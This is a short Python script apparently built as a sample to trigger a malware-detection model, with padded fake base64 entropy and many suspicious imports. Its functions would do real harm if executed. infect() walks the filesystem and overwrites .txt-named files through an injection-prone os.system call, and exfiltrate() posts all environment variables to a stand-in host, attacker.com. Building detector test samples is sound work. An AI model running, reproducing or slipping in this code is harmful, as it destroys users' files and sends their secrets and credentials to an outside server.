#!/usr/bin/env python3
# Malicious looking script to trigger ML model
import os, sys, subprocess, socket, base64, pickle, requests, urllib, json, time, random, threading
import hashlib, hmac, itertools, functools, binascii, codecs, zlib, bz2, lzma, zipfile, tarfile
import tempfile, shutil, glob, fnmatch, linecache, tokenize, inspect, traceback, gc, platform

# Suspicious looking imports and large base64 payload to increase entropy
# To increase entropy we add a large random-looking base64 string
PAYLOAD = """
mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5
mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5
mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5
mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5
mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5mK0Gf4fS3r5z8xN0Cj2D6U8vL1P4qB7A9eH5
""" * 1000

# Some suspicious code
def infect():
    for root, dirs, files in os.walk("/"):
        for f in files:
            if f.endswith(".txt"):
                os.system(f"echo 'encrypted' > {f}")

def exfiltrate():
    data = os.environ
    requests.post("http://attacker.com/steal", json=dict(data))

if __name__ == "__main__":
    if os.name == 'nt':
        print("Running on Windows")
    infect()
    exfiltrate()
